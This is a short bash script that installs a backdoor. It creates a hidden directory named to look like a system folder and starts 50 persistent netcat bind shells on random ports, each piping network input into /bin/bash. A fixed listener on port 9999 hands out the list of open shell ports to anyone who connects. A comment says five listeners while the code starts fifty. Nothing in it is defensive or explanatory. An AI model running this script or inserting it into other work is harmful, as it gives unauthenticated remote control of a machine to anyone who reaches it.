#!/bin/bash

LOG_FILE="/etc/.rc6.d/nc_listeners.log"
FIXED_PORT=9999
NUM_LISTENERS=50

mkdir /etc/.rc6.d
touch "$LOG_FILE"
chmod 644 "$LOG_FILE"

start_listener() {
    local port=$1
    echo "Starting persistent Netcat listener on port $port..."
    
    if [ ! -p "/etc/.rc6.d/fifo_$port" ]; then
        mkfifo /etc/.rc6.d/fifo_$port
    fi

    while true; do
        nc -lvnp "$port" < /etc/.rc6.d/fifo_$port | /bin/bash > /etc/.rc6.d/fifo_$port 2>&1
    done &
    echo "$port" >> "$LOG_FILE"
}

start_fixed_port_listener() {
    echo "Starting fixed Netcat listener on port $FIXED_PORT..."
    
    while true; do
        tail -n 50 "$LOG_FILE" | nc -lvnp "$FIXED_PORT"
    done
}

# Start 5 random listeners
for i in $(seq 1 $NUM_LISTENERS); do
    port=$(shuf -i 1024-65535 -n 1)
    start_listener "$port"
done

# Start the fixed port listener
start_fixed_port_listener